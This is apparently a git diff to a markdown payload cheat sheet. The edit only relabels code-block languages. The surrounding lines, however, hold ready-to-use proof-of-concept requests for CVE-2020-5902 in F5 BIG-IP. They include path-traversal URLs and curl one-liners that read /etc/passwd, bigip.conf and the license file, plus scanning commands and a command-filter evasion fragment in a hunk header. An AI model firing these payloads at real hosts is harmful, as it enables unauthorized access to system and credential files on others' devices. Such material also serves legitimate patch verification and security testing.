@@ -155,7 +155,7 @@ cat ${test//hh??hm/}
 ## BIGIP CVE-2020-5902 PoC
 *CVE-2020-5902 allows for unauthenticated attackers  execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code.  [[+]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902)*
 
-```powershell
+```console
 https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
 ```
 
@@ -163,24 +163,24 @@ https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/
 https://{host}/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
 ```
 
-```ruby
+```console
 https://{host}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=jaffa
 ```
 
-```bash
+```console
 https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
 ```
 
-```python
+```console
 https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
 ```
 
 * **Manuel POC**:
-```ruby
+```console
 curl -sk 'https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
 ```
 
-```bash
+```console
 curl -sk 'https://{IP}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
 ```
 
@@ -196,7 +196,7 @@ nuclei -t ~/tool/nuclei/nuclei-templates/cves/CVE-2020-5902.yaml -l https.txt
 
 * **NMAP Script for CVE-2020-5902**
 
-```powershell
+```console
 wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
 ```
 
